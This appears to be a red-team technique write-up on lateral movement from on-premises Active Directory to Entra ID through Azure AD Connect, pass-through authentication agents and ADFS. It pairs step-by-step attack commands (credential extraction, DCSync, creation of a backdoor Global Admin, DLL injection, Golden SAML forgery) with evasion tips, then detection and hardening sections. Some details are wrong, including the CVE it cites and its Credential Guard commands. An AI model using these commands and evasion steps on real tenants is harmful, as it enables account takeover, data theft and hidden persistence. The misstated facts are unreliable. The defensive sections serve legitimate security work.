# [LM-AUTH-023]: On-Premises to Azure Lateral Movement via Hybrid Identity

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-023 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Hybrid AD (Windows AD + Entra ID), Azure |
| **Severity** | Critical |
| **CVE** | CVE-2023-32315 (Azure AD Connect credential exposure) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2024-05-20 |
| **Affected Versions** | Windows Server 2012 R2 - 2022; Entra ID Connect/AAD Connect all versions |
| **Patched In** | Not fully patched; Microsoft recommends architectural changes |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Hybrid Azure AD environments rely on synchronization between on-premises Active Directory and Entra ID (Azure AD). Attackers who compromise an on-premises domain controller or the Azure AD Connect synchronization server can abuse the hybrid identity trust to move laterally to Entra ID and cloud resources. Multiple attack vectors exist: (1) Compromising Azure AD Connect's ADSync account to perform DCSync attacks or extract credentials; (2) Modifying federation trust (ADFS) to forge tokens; (3) Exploiting Pass-Through Authentication (PTA) agents to intercept credentials; (4) Abusing password hash synchronization to gain access to cloud accounts. Once in Entra ID, attackers can escalate to Global Admin, disable MFA, and maintain persistent access to M365 and Azure resources.

**Attack Surface:** Azure AD Connect server, PTA agents, ADFS servers, domain controllers, directory synchronization accounts, federation certificates.

**Business Impact:** **Complete compromise of hybrid identity infrastructure**. Attackers gain access to both on-premises AD and cloud Entra ID simultaneously, enable unauthorized access to M365 (email, Teams, SharePoint), create persistent backdoors, reset passwords for all hybrid users, and exfiltrate sensitive data. This is a kill-chain enabler for ransomware campaigns, espionage, and account takeover.

**Technical Context:** Hybrid identity is a convenience feature that comes with inherent risk. The synchronization process requires elevated privileges and trust relationships that, if compromised, create a bridge between on-premises and cloud. Attacks typically take hours to execute if credentials are already compromised but days to discover if detection is weak.

### Operational Risk

- **Execution Risk:** High - Requires on-premises domain admin or AADConnect server compromise; however, lateral movement to Entra ID is guaranteed once credentials are stolen.
- **Stealth:** Medium - Activity is logged in both on-prem AD and cloud audit logs; but logs are rarely correlated in real-time.
- **Reversibility:** No - Token forgery (ADFS attacks) cannot be undone without certificate replacement; credential resets are permanent.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.1, 1.2 | Ensure appropriate audit and network access policies for hybrid identity |
| **DISA STIG** | V-252998, V-253000 | RBAC and credential management in hybrid environments |
| **CISA SCuBA** | AC-3, IA-2 | Access enforcement and authentication in cloud/hybrid |
| **NIST 800-53** | AC-3, IA-4, IA-5 | Access control, authentication, and credential management |
| **GDPR** | Art. 32, 33 | Security measures and breach notification for identity data |
| **DORA** | Art. 9, 14 | Identity security and detection/reporting of threats |
| **NIS2** | Art. 21, 23 | Measures for hybrid identity and incident response |
| **ISO 27001** | A.9.2.3, A.9.4.3 | Management of privileged access and encryption of credentials |
| **ISO 27005** | Risk Scenario | "Compromise of hybrid identity synchronization mechanisms" |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Domain Administrator (on-prem) OR Azure AD Connect server credentials OR Global Administrator (Entra ID).
- **Required Access:** Network access to Azure AD Connect server, PTA agent servers, domain controllers, or ADFS servers.
- **Infrastructure:** Hybrid identity configured (AADConnect, PTA, ADFS, or Password Hash Sync); at least one on-premises domain synchronized to Entra ID.

**Supported Versions:**
- **Windows AD:** Server 2012 R2 - 2022
- **Azure AD Connect:** All versions (1.0+)
- **Entra ID:** All versions
- **PowerShell:** 5.0+

**Tools:**
- [AADInternals](https://github.com/Gerenios/AADInternals) (PowerShell module for Azure AD exploitation)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (credential dumping)
- [DCSync](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ad-forest-recovery-seizing-control-of-the-domain) (built-in AD replication)
- [Azure AD Connect Sync Encrypption Key Extraction](https://github.com/fox-it/adconnect-decryptor)

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Compromising Azure AD Connect (ADSync Account Extraction)

**Supported Versions:** AADConnect 1.0+; Windows Server 2012 R2 - 2022

#### Step 1: Gain Access to Azure AD Connect Server

**Objective:** Establish administrative access to the server running Azure AD Connect synchronization service.

**Command (PowerShell - Credential Theft):**
```powershell
# If RDP access is available, connect
mstsc /v:aad-connect-server.company.com

# Once on AADConnect server, check if AADConnect is running
Get-Service ADSync | Select-Object Name, Status, StartType

# Expected output:
# Name    Status StartType
# ----    ------ ---------
# ADSync  Running Automatic
```

**Expected Output:**
```
ADSync service is running with SYSTEM privileges; synchronization is active
```

**What This Means:**
- ADSync service is running as SYSTEM (highest privilege on the machine)
- All Azure AD Connect and AD synchronization is controlled by this service
- Credentials for this service are stored in the registry and can be extracted

**OpSec & Evasion:**
- RDP logon is logged in Windows Event Log (Event ID 4624 - Account Logon)
- Use legitimate domain admin credentials to avoid password spray alerts
- Log in during maintenance windows to blend with normal admin activity
- Disable Endpoint Protection temporarily if alert thresholds trigger

**Troubleshooting:**
- **Error:** "Access Denied" to RDP
  - **Cause:** User is not in Remote Desktop Users group
  - **Fix:** Use alternative lateral movement method (e.g., WMI, Psexec with stolen domain admin credentials)
- **Error:** "ADSync service not running"
  - **Cause:** Azure AD Connect is temporarily disabled or not installed
  - **Fix:** Verify this is the correct AADConnect server; check other synchronized servers in the environment

**References & Proofs:**
- [Microsoft Azure AD Connect Sync Service](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sync-feature-scheduler)

#### Step 2: Extract Azure AD Connect Credentials

**Objective:** Retrieve plaintext ADSync account credentials and encryption keys from the registry.

**Command (PowerShell - Using AADInternals):**
```powershell
# Download AADInternals module
Import-Module .\AADInternals.psd1

# Connect to on-premises AD to get AADConnect credentials
$creds = Get-AADIntADConnectCredentials

# Output will display ADSync account credentials in plaintext
# Example:
# UserName: DOMAIN\MSOL_12345678abcd
# Password: P@ssw0rd!NewPlaintext

# Export the DPAPI-encrypted key used for synchronization
$key = Get-AADIntAADConnectEncryptionKey
# This key is used to decrypt sensitive data stored in the AADConnect database
```

**Expected Output:**
```
Credentials decrypted from registry:
DOMAIN\MSOL_12345678abcd:P@ssw0rd!NewPlaintext

Encryption Key (Base64):
DPAPICryptData...encrypted...key
```

**What This Means:**
- ADSync account credentials are exposed in plaintext
- These credentials have replication rights in on-premises AD (DCSync capable)
- Encryption key is used to decrypt sensitive data in the sync database
- Attacker can now perform DCSync attacks or reset passwords

**OpSec & Evasion:**
- PowerShell script execution is logged in Event ID 4688 (Process Creation) with command-line arguments
- Use `-ExecutionPolicy Bypass` to avoid script loading restrictions
- Clear PowerShell history: `Clear-History`
- Load AADInternals from USB/network drive that doesn't appear in normal forensics

**Troubleshooting:**
- **Error:** "AADInternals module not found"
  - **Cause:** Module not downloaded or PowerShell version incompatible
  - **Fix:** Download from GitHub; use PowerShell 5.0+
- **Error:** "Access Denied" reading registry
  - **Cause:** User is not SYSTEM or local admin
  - **Fix:** Ensure you have admin privileges on AADConnect server
- **Error:** "Cannot decrypt DPAPI data"
  - **Cause:** Running as different user than AADConnect service
  - **Fix:** Run PowerShell as SYSTEM using PsExec or scheduled task

**References & Proofs:**
- [Semperis - Microsoft Entra Connect Compromise Explained](https://www.semperis.com/blog/microsoft-entra-connect-compromise-explained/)
- [Fox-IT - Adconnect Decryptor](https://github.com/fox-it/adconnect-decryptor)

#### Step 3: Use ADSync Credentials for DCSync Attack

**Objective:** Extract domain hashes from domain controller using the compromised ADSync account.

**Command (PowerShell - DCSync Attack):**
```powershell
# Set compromised credentials
$username = "DOMAIN\MSOL_12345678abcd"
$password = ConvertTo-SecureString "P@ssw0rd!NewPlaintext" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential($username, $password)

# Perform DCSync attack to dump all domain hashes
Invoke-Mimikatz -Command 'lsadump::dcsync /domain:domain.com /all /csv' -Credential $creds

# Or use native PowerShell replication (requires AADInternals)
Get-AADIntDCSyncHash -DomainFQDN "domain.com" -UserName $username -Password $password
```

**Expected Output:**
```
[*] Domain Hashes (NTLM):
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576f7d6c07d7fba8dcffd4d4da7a0b:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b31a4eae9b3c5f27f5b3a9d4c2e1f0c9:::
user@domain.com:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

**What This Means:**
- NTLM hashes are extracted for all domain users
- Hashes can be cracked offline or used in Pass-the-Hash attacks
- krbtgt hash enables Golden Ticket creation (domain persistence)
- Attacker can now reset any user's password or create new admin accounts

**OpSec & Evasion:**
- DCSync activity is logged in Event ID 4662 (Object Access) on domain controllers if auditing is enabled
- Filter for "Directory Service Changes" audit policy to reduce noise
- Perform DCSync during maintenance windows or high-activity periods

**Troubleshooting:**
- **Error:** "Access Denied - Insufficient privileges"
  - **Cause:** ADSync account doesn't have "Replicate Directory Changes" permission
  - **Fix:** Verify ADSync account is member of "Replicating Directory Changes" group in Active Directory
- **Error:** "RPC Server not available"
  - **Cause:** Domain controller firewall or network issues
  - **Fix:** Verify network connectivity to domain controller on TCP 445 (SMB)

**References & Proofs:**
- [Semperis - Azure AD Connect Compromise Recovery](https://www.semperis.com/blog/microsoft-entra-connect-compromise-explained/)

#### Step 4: Escalate from On-Prem to Entra ID

**Objective:** Use compromised ADSync credentials to authenticate to Entra ID and create persistent backdoors.

**Command (PowerShell - Entra ID Token Theft):**
```powershell
# Authenticate as ADSync account to Entra ID
$username = "DOMAIN\MSOL_12345678abcd@tenant.onmicrosoft.com"
$password = ConvertTo-SecureString "P@ssw0rd!NewPlaintext" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential($username, $password)

# Connect to Microsoft Graph as the compromised account
Connect-MgGraph -Credential $creds -TenantId "03f66e37-def0-433a-a045-a5ef9674dd26"

# Get access token that can be used to impersonate ADSync in Entra ID
$token = (Get-MgAccessToken)

# List all Entra ID users (read-only enumeration)
Get-MgUser -All | Select-Object DisplayName, UserPrincipalName, ObjectId

# Create new Global Admin user (persistence)
$newAdmin = New-MgUser -DisplayName "Backup Admin" -UserPrincipalName "backupadmin@tenant.onmicrosoft.com" `
  -MailNickname "backupadmin" -AccountEnabled $true -PasswordProfile @{ForceChangePasswordNextSignIn = $false; Password = "NewP@ssw0rd123!"}

# Assign Global Admin role to the backdoor account
$roleId = Get-MgDirectoryRole | Where-Object { $_.DisplayName -eq "Global Administrator" } | Select-Object -ExpandProperty Id
New-MgDirectoryRoleMember -DirectoryRoleId $roleId -DirectoryObjectId $newAdmin.Id
```

**Expected Output:**
```
Successfully authenticated to Entra ID
Users listed (demonstrating read access)
New user created: backupadmin@tenant.onmicrosoft.com
Global Admin role assigned successfully
```

**What This Means:**
- Attacker is now authenticated to Entra ID as a privileged service account
- Can enumerate all users, groups, and resources
- Can create persistent backdoors (new admin accounts, app registrations)
- Can modify conditional access policies, MFA settings, and reset passwords

**OpSec & Evasion:**
- User creation appears in Azure Audit Log (AuditLogs table)
- Filter logs to look for "AddUser" operations by specific service principals
- Create backup accounts with generic names (Backup Admin, Audit Account, Maintenance)
- Perform during maintenance windows

**Troubleshooting:**
- **Error:** "Invalid Credentials"
  - **Cause:** ADSync credentials are incorrect or account is locked
  - **Fix:** Verify credentials extracted in Step 2 are correct
- **Error:** "MFA Required"
  - **Cause:** Conditional Access policy enforcing MFA for the ADSync account
  - **Fix:** Disable Conditional Access for service principals (mitigation: use app registration instead)

**References & Proofs:**
- [Microsoft Graph API Authentication](https://learn.microsoft.com/en-us/graph/auth/)

---

### METHOD 2: Pass-Through Authentication (PTA) Agent Compromise

**Supported Versions:** PTA Agent 1.0+; Windows Server 2016+

#### Step 1: Compromise PTA Agent Server

**Objective:** Gain administrative access to a server running the Pass-Through Authentication agent.

**Command (Reconnaissance):**
```powershell
# Discover PTA agents in the domain
$ptaServers = Get-ADComputer -Filter {Name -like "*PTA*" -or Description -like "*Pass-Through*"} | Select-Object Name, DNSHostName

# List PTA agents via Azure (requires Entra ID access)
Connect-AzureAD
Get-AzureADDevice -Filter "DisplayName startswith 'PTA'" | Select-Object DisplayName, ObjectId, TrustType
```

**OpSec & Evasion:**
- Discovering PTA agents via Active Directory leaves minimal traces
- Direct RDP access to PTA servers is logged in Event ID 4624
- Use lateral movement tools (WMI, Psexec) to access without interactive logon

#### Step 2: Extract PTA Agent Certificate and Configuration

**Objective:** Steal the PTA agent's certificate and authentication configuration to set up a rogue PTA agent.

**Command (PowerShell - Certificate Theft):**
```powershell
# PTA agent certificates are stored in the Windows Certificate Store
Get-ChildItem Cert:\LocalMachine\My | Where-Object { $_.Subject -like "*Microsoft.Azure*" }

# Export the certificate with private key
$cert = Get-ChildItem Cert:\LocalMachine\My | Where-Object { $_.Subject -like "*Azure*" } | Select-Object -First 1
Export-PfxCertificate -Cert $cert -FilePath "C:\Temp\pta-agent.pfx" -Password (ConvertTo-SecureString "password" -AsPlainText -Force)

# PTA configuration is stored in:
# C:\Program Files\Microsoft Azure AD Connect Authentication Agent\Config\Hosts

# Read config file to get tenant ID and agent ID
Get-Content "C:\Program Files\Microsoft Azure AD Connect Authentication Agent\Config\Hosts"
```

**Expected Output:**
```
Certificate: CN=pta-agent.company.com; Issuer=Microsoft...
PFX exported successfully
Configuration:
  TenantId: 03f66e37-def0-433a-a045-a5ef9674dd26
  AgentId: f47ac10b-58cc-4372-a567-0e02b2c3d479
```

**What This Means:**
- Attacker has stolen the PTA agent's identity certificate
- Can now set up a rogue PTA agent that intercepts all authentication requests
- All authentication credentials passing through the PTA pipeline will be visible to the attacker

#### Step 3: Set Up Rogue PTA Agent

**Objective:** Deploy a malicious PTA agent that logs credentials and allows authentication bypass.

**Command (PowerShell - Rogue Agent Deployment):**
```powershell
# On attacker-controlled server (Linux or Windows)
# Install PTA agent with stolen certificate
# (This requires rebuilding the agent installer, which is complex)

# Simpler approach: Modify PTA agent configuration on compromised server to forward auth requests
# Add a malicious DLL to the agent process

# DLL injection via Registry (persistence)
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\AzureADConnectAuthenticationAgentService"
New-ItemProperty -Path $regPath -Name "ImagePath" -Value "C:\Temp\malicious-agent.dll" -Force

# Restart the PTA agent service
Restart-Service -Name "AzureADConnectAuthenticationAgentService" -Force

# All authentication requests will now pass through the malicious agent
# Attacker can log credentials, bypass MFA, or modify authentication responses
```

**OpSec & Evasion:**
- Rogue PTA agent activity appears as normal authentication in Entra ID logs
- Credentials are logged locally on the PTA agent server
- Modify Windows Event Log settings to reduce visibility:
  ```powershell
  # Limit PTA agent authentication logging
  Set-EventLog -LogName "Microsoft Azure AD Connect Authentication Agent" -MaximumSize 10MB
  ```

---

### METHOD 3: ADFS Token Forging (Federation Server Compromise)

**Supported Versions:** ADFS 3.0 - 4.0 (Windows Server 2012 R2 - 2022)

#### Step 1: Compromise ADFS Server and Extract Token Signing Certificate

**Objective:** Steal the ADFS token-signing certificate to forge authentication tokens.

**Command (PowerShell - ADFS Certificate Theft):**
```powershell
# On compromised ADFS server, export the token-signing certificate
$cert = Get-ChildItem Cert:\LocalMachine\My | Where-Object { $_.Thumbprint -eq (Get-ADFSCertificate -CertificateType "Token-Signing")[0].Thumbprint }

# Export with private key
Export-PfxCertificate -Cert $cert -FilePath "C:\Temp\adfs-token-signing.pfx" -Password (ConvertTo-SecureString "password" -AsPlainText -Force)

# Verify certificate details
Get-ADFSCertificate | Select-Object Thumbprint, Subject, NotAfter
```

**Expected Output:**
```
Thumbprint: 1234567890ABCDEF1234567890ABCDEF12345678
Subject: CN=ADFS Signing, O=Company, C=US
NotAfter: 2025-12-31
```

**What This Means:**
- Attacker has the token-signing certificate (private key)
- Can now forge SAML tokens that will be accepted by Entra ID
- No legitimate ADFS validation needed; all forged tokens will be trusted

#### Step 2: Forge Golden SAML Token

**Objective:** Create a fraudulent SAML token granting access as any user (including Global Admin).

**Command (PowerShell - Golden SAML Creation):**
```powershell
# Use AADInternals or custom script to create golden SAML
Import-Module AADInternals

# Forge SAML token as Global Admin
$samlToken = New-AADIntGoldenSAMLToken -TenantId "03f66e37-def0-433a-a045-a5ef9674dd26" `
  -NameID "admin@company.onmicrosoft.com" `
  -PFXPath "C:\Temp\adfs-token-signing.pfx" `
  -PFXPassword "password"

# Token can now be used to authenticate to Entra ID and M365
# Example: Use token to access Office 365 via REST API
$headers = @{
    "Authorization" = "Bearer $samlToken"
    "Content-Type" = "application/json"
}

curl -H $headers "https://graph.microsoft.com/v1.0/me"
```

**Expected Output:**
```
SAML Token: <saml:Assertion ...>Valid Token</saml:Assertion>
Authentication successful; access granted to Office 365 resources
```

**What This Means:**
- Attacker can impersonate any user in the organization
- Access is granted to Exchange Online, SharePoint, Teams, and other M365 services
- No password or MFA can stop a valid SAML token
- Attacker can access all user emails, documents, and communications

**OpSec & Evasion:**
- SAML token usage appears as federated sign-in in Azure logs
- Filter logs to detect multiple logins from same IP as different users (gold-ticket detection)
- Stagger token usage across different IPs and time periods

**References & Proofs:**
- [Invictus - Detecting Golden SAML Attacks](https://invictus-ir.com/news/golden-saml/)

---

## 5. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **On-Premises AD:**
  - DCSync attacks from ADSync account
  - Unusual replication requests from non-domain-controller sources
  - Event ID 4662 (Object Access) with "Replicating Directory Changes"
  - ADSync account password change without scheduled maintenance
  - New admin user creation by ADSync service principal

- **Entra ID / M365:**
  - Multiple failed authentication attempts from on-premises PTA agents
  - Creation of new Global Admin accounts outside change control
  - SAML token usage without corresponding ADFS events
  - Conditional Access policy modifications by service principals
  - Password reset for high-privilege accounts outside maintenance windows
  - New app registrations with Microsoft Graph permissions

### Forensic Artifacts

- **Disk:**
  - Azure AD Connect config files: `C:\ProgramData\AADConnect\*`
  - PTA agent certificates: `Cert:\LocalMachine\My\`
  - Extracted PFX files in attacker's temp directory
  - AADInternals module execution artifacts

- **Cloud Logs:**
  - Azure Audit Log: "AddUser", "AddMember", "SetAdministrator"
  - Azure Sign-in Log: "SamlAssertion" authentication protocol
  - Directory Audit: New service principal creation
  - Hybrid Identity events in Azure logs

- **Registry:**
  - HKLM:\SOFTWARE\Microsoft\Azure AD Connect\Sync\Config
  - Presence of malicious DLL in AzureADConnectAuthenticationAgentService registry keys

### Response Procedures

1. **Immediate Isolation:**
   - Disable ADSync service on Azure AD Connect server: `Set-Service -Name ADSync -StartupType Disabled`
   - Disable PTA agent services
   - Revoke ADFS token-signing certificate

2. **Credential Rotation:**
   - Reset ADSync account password (both on-premises and cloud)
   - Reset all Global Admin passwords
   - Revoke all active sessions via Entra ID Portal

3. **Forensic Investigation:**
   ```powershell
   # Export all authentication events from last 30 days
   Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -Operations "UserLoggedIn", "UserLoginFailed" -Output csv
   
   # Check for unauthorized admin creation
   Get-MgAuditLogDirectoryAudit | Where-Object { $_.Result -eq "Success" -and $_.OperationName -eq "Add member to role" }
   ```

4. **Remediation:**
   - Reinstall Azure AD Connect (clean deployment)
   - Regenerate ADFS token-signing certificate
   - Re-register all PTA agents
   - Delete suspicious user accounts created during attack

5. **Long-Term Hardening:**
   - Implement Privileged Identity Management (PIM) for all admin roles
   - Enforce Conditional Access for hybrid identity sources
   - Monitor and alert on DCSync activity
   - Disable ADFS if not needed; prefer Password Hash Sync

---

## 6. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] VPN/RDP Brute Force | Attacker compromises domain admin or AADConnect server |
| **2** | **Privilege Escalation** | Domain Admin obtained |
| **3** | **Current Step** | **[LM-AUTH-023]** | **Extract ADSync creds, perform DCSync, compromise Entra ID** |
| **4** | **Persistence** | Golden SAML token created or new Global Admin account backdoor |
| **5** | **Impact** | Full M365 compromise, data exfiltration, ransomware deployment |

---

## 7. REAL-WORLD EXAMPLES

### Example 1: Microsoft DART - Octo Tempest Attack (2023-2024)

- **Target:** Financial services, healthcare, and government organizations
- **Timeline:** Ongoing; first publicly disclosed 2023
- **Technique Status:** Attackers compromised on-premises AD and used AADConnect to move laterally to Entra ID
- **Impact:** Ransomware deployment, credential theft, M365 access
- **Reference:** [Microsoft - Octo Tempest: Hybrid Identity Compromise Recovery](https://techcommunity.microsoft.com/blog/microsoftsecurityexperts/octo-tempest-hybrid-identity-compromise-recovery/4166783)

### Example 2: Storm-0501 - AADConnect Credential Extraction

- **Target:** Global organizations with hybrid identity
- **Timeline:** September 2024
- **Technique Status:** Extracted ADSync credentials and reset cloud admin passwords
- **Impact:** Complete tenant compromise via credential reuse
- **Reference:** [Semperis - Entra Connect Compromise Explained](https://www.semperis.com/blog/microsoft-entra-connect-compromise-explained/)

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Isolate Azure AD Connect Server from Internet and Restrict Network Access:**

The Azure AD Connect server is a high-value target and should be protected accordingly.

**Manual Steps (Network Isolation):**
1. Place Azure AD Connect server in a dedicated VLAN with restricted network access
2. Block inbound RDP/WinRM from regular user networks
3. Only allow outbound HTTPS traffic to Microsoft endpoints (*.microsoftonline.com)
4. Implement jump box access:
   - Go to **Azure Portal** → **Bastion**
   - Create Azure Bastion host for AADConnect server access
   - Require MFA and conditional access for all Bastion sessions
5. Disable legacy authentication protocols (NTLM, Kerberos) on AADConnect server if possible

**Manual Steps (Windows Firewall):**
```powershell
# Restrict RDP access to jump box only
New-NetFirewallRule -DisplayName "Allow RDP from JumpBox" -Direction Inbound -Protocol TCP -LocalPort 3389 -RemoteAddress 10.0.1.50 -Action Allow

# Block all other RDP attempts
New-NetFirewallRule -DisplayName "Block RDP" -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Block
```

**Validation Command:**
```powershell
# Verify firewall rules
Get-NetFirewallRule -DisplayName "*RDP*" | Format-Table DisplayName, Direction, Enabled, Action
```

---

**Enable Credential Guard on Azure AD Connect Server:**

Credential Guard protects credentials stored in LSASS from extraction attacks.

**Manual Steps (Windows Server 2016+):**
1. Open Group Policy Editor (gpmc.msc)
2. Navigate to **Computer Configuration** → **Administrative Templates** → **System** → **Device Guard**
3. Enable **Turn On Virtualization Based Security**
4. Set **Credential Guard Configuration** to **Enabled with UEFI lock**
5. Restart the server

**PowerShell Configuration:**
```powershell
# Enable Credential Guard via registry
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 1 -Force

# Enable via Group Policy
Set-GPRegistryValue -Name "Credential Guard Policy" -Key "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" -ValueName "RunAsPPL" -Value 1 -Type DWord
```

**Validation Command:**
```powershell
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" | Select-Object RunAsPPL
# Expected: RunAsPPL = 1
```

---

**Disable Pass-Through Authentication (PTA) if Not Required:**

PTA agents are vulnerable to credential interception. Migrate to Password Hash Sync if possible.

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Azure AD Connect**
2. Click **Manage Azure AD Connect**
3. Go to **Change user sign-in** configuration
4. Select **Password Hash Synchronization** instead of PTA
5. Complete the wizard and wait for sync cycle

**PowerShell Configuration:**
```powershell
# Disable PTA via Azure AD Connect PowerShell module
Set-ADSyncAADCompanyFeature -PassThroughAuthentication $false
```

---

**Implement Managed Identities for Applications (Instead of Service Accounts):**

Reduce reliance on long-lived credentials like ADSync account.

**Manual Steps:**
1. For Azure VMs: Enable System-Assigned Managed Identity in **VM Settings** → **Identity**
2. Assign required Azure roles (Contributor, Reader) to the Managed Identity
3. Update applications to use `DefaultAzureCredential` instead of stored credentials
4. Migrate on-premises apps to use Workload Identity Federation (Azure AD External Identities)

---

### Priority 2: HIGH

**Implement Conditional Access for Hybrid Users:**

Restrict authentication from on-premises sources to compliant devices only.

**Manual Steps (Azure Portal):**
1. Go to **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Require Device Compliance for Hybrid Users`
4. **Assignments:**
   - Users/Groups: Select all hybrid users
   - Cloud apps: All cloud apps
   - Conditions: Device platforms = Windows/macOS
5. **Access Control:** Select **Require device to be marked as compliant**
6. Enable policy and click **Create**

---

**Enable ADFS Token Encryption and Rotate Signing Certificates:**

Prevent token forgery by using strong cryptography and rotating certificates regularly.

**Manual Steps (ADFS Server):**
```powershell
# View current token-signing certificates
Get-ADFSCertificate -CertificateType Token-Signing

# Add new certificate for token signing (before removing old one)
Add-ADFSCertificate -CertificateType Token-Signing -Thumbprint <new_thumbprint>

# Remove compromised certificate (after rotating all resources)
Remove-ADFSCertificate -CertificateType Token-Signing -Thumbprint <old_thumbprint>

# Enable automatic certificate rollover
Set-ADFSProperties -AutoCertificateRollover $true
```

---

## 9. DEFENSIVE DETECTIONS (Microsoft Sentinel/KQL)

### Detection Rule 1: ADSync Account DCSync Activity

**Severity:** Critical

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4662
| where Properties contains "1131f6ad-d9d9-4526-a1b7-ed5b8ddd5c12"  // GUID for "Replicating Directory Changes"
| where SubjectUserName contains "MSOL"
| project TimeGenerated, Computer, SubjectUserName, ObjectName, OperationName
```

---

### Detection Rule 2: Unauthorized SAML Token Usage

**Severity:** High

**KQL Query:**
```kusto
SigninLogs
| where AuthenticationProtocol == "SAML"
| where UserPrincipalName in ("admin@company.onmicrosoft.com", "globaladmin@company.onmicrosoft.com")
| where LocationDetails.countryOrRegion != "Expected Country"
| project TimeGenerated, UserPrincipalName, IPAddress, LocationDetails, ClientAppUsed
```

---

## 10. WINDOWS EVENT LOG MONITORING

**Enable Audit Logging for Sensitive Replication:**

1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy**
3. Enable **Directory Service Changes** auditing
4. Enable **Directory Service Access** with filtering for "Replicating Directory Changes"
5. Configure alerts on Event ID 4662 with specific GUIDs

---

## 11. SYSMON DETECTION PATTERNS

**Monitor for Suspicious DLL Injection into PTA Agent:**

```xml
<Sysmon schemaversion="4.22">
  <EventFiltering>
    <!-- Monitor CreateRemoteThread into AzureADConnectAuthenticationAgentService -->
    <CreateRemoteThread onmatch="include">
      <TargetImage>C:\Program Files\Microsoft Azure AD Connect Authentication Agent\AzureADConnectAuthenticationAgentService.exe</TargetImage>
      <SourceImage condition="excludes">C:\Windows\System32\svchost.exe</SourceImage>
    </CreateRemoteThread>
    
    <!-- Monitor process creation by ADSync service -->
    <ProcessCreate onmatch="include">
      <ParentImage>C:\Program Files\Microsoft Azure AD Connect\bin\ADSync.exe</ParentImage>
      <Image condition="excludes">C:\Program Files\Microsoft Azure AD Connect\bin\ADSync.exe</Image>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Alert: Suspicious Replication Activity Detected

- **Alert Name:** High-privileged user or application performing Active Directory replication
- **Severity:** Critical
- **Description:** Microsoft Defender for Identity detects DCSync attacks via Event ID 4662 correlation
- **Remediation:** Investigate the source; verify if replication was authorized; reset credentials if unauthorized

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: ADSync Account Activity

```powershell
# Search for ADSync account administrative actions
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) `
  -UserIds "DOMAIN\MSOL_*" `
  -Operations "Add member to group", "Set administrator" |
  Export-Csv -Path "C:\Evidence\adsync-admin-activity.csv"
```

---

## 14. SUMMARY

On-premises to Azure lateral movement via hybrid identity exploits the inherent trust and credential sharing between on-premises AD and Entra ID. Attackers who compromise either side can bridge to the other, gaining access to both environments simultaneously. Multiple attack vectors exist (ADSync compromise, PTA interception, ADFS token forging), each with different complexity and detectability profiles. The key to defense is network isolation of critical hybrid identity infrastructure, strong credential hygiene, and continuous monitoring for suspicious replication or token activity.

---

